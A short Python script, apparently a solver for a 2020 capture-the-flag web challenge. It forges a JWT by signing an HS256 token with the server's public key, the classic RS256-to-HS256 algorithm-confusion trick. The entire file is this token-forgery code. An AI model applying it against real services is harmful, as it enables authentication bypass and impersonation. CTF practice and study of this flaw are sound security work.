#!/usr/bin/env python3

# https://dev.to/baconpotatocat/stacks-2020-ctf-unlock-me-web-27bj

import base64, hmac, hashlib

with open("pubkey.pem", 'r') as f:
    pubkey = f.read()

header = '{"typ": "JWT", "alg": "HS256", "kid": "3"}'
payload = '{"string": "allo", "role": "guest"}'

headerBytes = base64.urlsafe_b64encode(header.encode('utf-8'))
encodedHeader = str(headerBytes, "utf-8").rstrip("=")

payloadBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(payloadBytes, "utf-8").rstrip("=")

token = (encodedHeader + "." + encodedPayload)

signature = base64.urlsafe_b64encode(hmac.new(bytes(pubkey, "UTF-8"), token.encode("utf-8"),hashlib.sha256).digest()).decode("UTF-8").rstrip("=")

jwt = token+"."+signature
print(jwt)
